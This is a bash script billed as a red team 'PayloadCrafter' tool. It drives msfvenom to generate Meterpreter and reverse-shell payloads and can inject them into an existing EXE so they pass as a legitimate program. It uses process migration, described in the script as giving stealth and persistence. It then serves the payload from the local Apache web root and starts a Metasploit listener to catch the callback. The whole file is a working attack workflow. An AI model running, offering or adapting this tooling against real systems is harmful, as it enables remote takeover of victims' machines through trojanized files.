#!/bin/bash

# ╔════════════════════════════════════════════════════════════╗
# ║           PayloadCrafter - by EveRoy - Red Team Toolkit    ║
# ╚════════════════════════════════════════════════════════════╝

# Function to check and install a package if not already installed
install_if_missing() {
  if ! command -v "$1" &> /dev/null; then
    echo "[*] Installing $1..."
    sudo apt install -y "$1"
  else
    echo "[+] $1 is already installed."
  fi
}

# Function to check Ruby gem if lolcat is missing
install_lolcat_if_missing() {
  if ! command -v lolcat &> /dev/null; then
    echo "[*] Installing lolcat..."
    sudo gem install lolcat
  else
    echo "[+] lolcat is already installed."
  fi
}

# Install required tools only if missing
echo "[*] Checking and installing required tools if needed..."
sudo apt update
install_if_missing toilet
install_if_missing figlet
install_if_missing ruby
install_lolcat_if_missing

clear

# Fancy banner
echo -e "\e[1;36m╔═══════════════════════════════════════════════════════════╗"
toilet -f pagga "Payload-Crafter" -F border
echo -e "\e[1;36m╚═══════════════════════════════════════════════════════════╝\e[0m"
echo
echo -e "\\e[1;36m"
echo "      ╔═══════════════════════════════════════╗"
echo "      ║          Payload Generator            ║"
echo "      ║         Toolkit by - EveRoy           ║"
echo "      ╚═══════════════════════════════════════╝"
echo -e "\e[0m"

# === Script Logic Starts ===

# Payload options
payloads=(
  "windows/x64/meterpreter/reverse_https"
  "windows/x64/meterpreter/reverse_tcp"
  "windows/meterpreter_reverse_http"
  "windows/meterpreter_reverse_https"
  "linux/x64/meterpreter_reverse_tcp"
  "cmd/windows/reverse_powershell"
  "windows/shell_reverse_tcp"
  "windows/x64/meterpreter/bind_tcp"
  "python/meterpreter_reverse_tcp"
  "windows/x64/meterpreter/reverse_tcp_uuid"
)

echo "Select a payload:"
for i in "${!payloads[@]}"; do
  printf "%2d) %s\n" $((i+1)) "${payloads[$i]}"
done
read -p "Enter the number of the payload you want to use: " choice
if ! [[ "$choice" =~ ^[1-9]$|^10$ ]]; then
  echo "Invalid choice. Exiting."
  exit 1
fi
selected_payload="${payloads[$((choice-1))]}"
echo "Selected Payload: $selected_payload"

# Get LHOST
read -p "Enter LHOST (your IP address): " lhost
if [[ -z "$lhost" ]]; then
  echo "LHOST is required. Exiting."
  exit 1
fi

# Get LPORT
default_lport="4444"
read -p "Enter LPORT (default: $default_lport): " lport
lport=${lport:-$default_lport}
echo "Using LHOST: $lhost"
echo "Using LPORT: $lport"

# Output format
formats=("exe" "dll" "raw" "asp" "php" "elf" "macho")
echo "Choose output format:"
for i in "${!formats[@]}"; do
  printf "%2d) %s\n" $((i+1)) "${formats[$i]}"
done
read -p "Enter the number of the format you want to use: " fmt_choice
if ! [[ "$fmt_choice" =~ ^[1-9]$ ]] || (( fmt_choice < 1 || fmt_choice > ${#formats[@]} )); then
  echo "Invalid choice. Exiting."
  exit 1
fi
output_format="${formats[$((fmt_choice-1))]}"
filename="payload.${output_format}"
echo "Selected format: $output_format"

# Template injection
read -p "Do you want to use -x and -k (inject into an existing EXE)? [y/N]: " use_template
use_template=$(echo "$use_template" | tr '[:upper:]' '[:lower:]')
if [[ "$use_template" == "y" || "$use_template" == "yes" ]]; then
  read -p "Enter the full path to the EXE template file: " exe_path
  if [[ ! -f "$exe_path" ]]; then
    echo "File does not exist. Skipping -x and -k."
    use_template="no"
  else
    echo "Template injection enabled. Using file: $exe_path"
    inject_flags="-x $exe_path -k"
  fi
else
  use_template="no"
  inject_flags=""
fi

# Advanced options
declare -A adv_values
adv_opts=("PrependMigrate" "EXITFUNC" "HttpUserAgent")
adv_desc=(
  "PrependMigrate: Run the payload in a new process for stealth and persistence"
  "EXITFUNC: Defines how the payload should exit the process (options: thread, process, seh)"
  "HttpUserAgent: Sets the User-Agent string for HTTP communication"
)
echo "=== Advanced Payload Options ==="
for i in "${!adv_opts[@]}"; do
  echo
  echo "${adv_desc[$i]}"
  read -p "Set value for ${adv_opts[$i]} (press ENTER to use default): " value
  adv_values["${adv_opts[$i]}"]="$value"
done

# Detect payload type
echo
if [[ "$selected_payload" == *"meterpreter"* || "$selected_payload" == *"reverse_"* ]]; then
  echo "[+] This is a staged payload (multi-stage)."
else
  echo "[+] This is a stageless payload (single stage)."
fi

# Generate payload
msf_command="msfvenom -p $selected_payload LHOST=$lhost LPORT=$lport"
for key in "${!adv_values[@]}"; do
  if [[ -n "${adv_values[$key]}" ]]; then
    msf_command+=" $key=${adv_values[$key]}"
  fi
done
msf_command+=" $inject_flags -f $output_format -o $filename"
echo
echo "Generating payload with:"
echo "$msf_command"
eval "$msf_command"

# Apache2 handling
echo "[*] Checking Apache2 service..."
if systemctl is-active --quiet apache2; then
  echo "[+] Apache2 is already running."
else
  echo "[!] Apache2 is not running. Starting..."
  sudo systemctl start apache2 || { echo "Failed to start Apache2"; exit 1; }
fi
sudo cp "$filename" "/var/www/html/$filename"
ip=$(ip route get 1 | awk '{print $(NF-2); exit}')
echo "[+] Payload available at: http://$ip/$filename"

# Create listener.rc
rc_file="listener.rc"
echo "use exploit/multi/handler" > "$rc_file"
echo "set PAYLOAD $selected_payload" >> "$rc_file"
echo "set LHOST $lhost" >> "$rc_file"
echo "set LPORT $lport" >> "$rc_file"
for key in "${!adv_values[@]}"; do
  if [[ -n "${adv_values[$key]}" ]]; then
    echo "set $key ${adv_values[$key]}" >> "$rc_file"
  fi
done
echo "run" >> "$rc_file"
echo "[+] Listener configuration saved to $rc_file"

# Launch listener?
read -p "Do you want to launch the listener now? [y/N]: " run_listener
if [[ "$run_listener" == "y" || "$run_listener" == "Y" ]]; then
  msfconsole -qx "resource $rc_file"
else
  echo "[*] You can launch it later with: msfconsole -r $rc_file"
fi
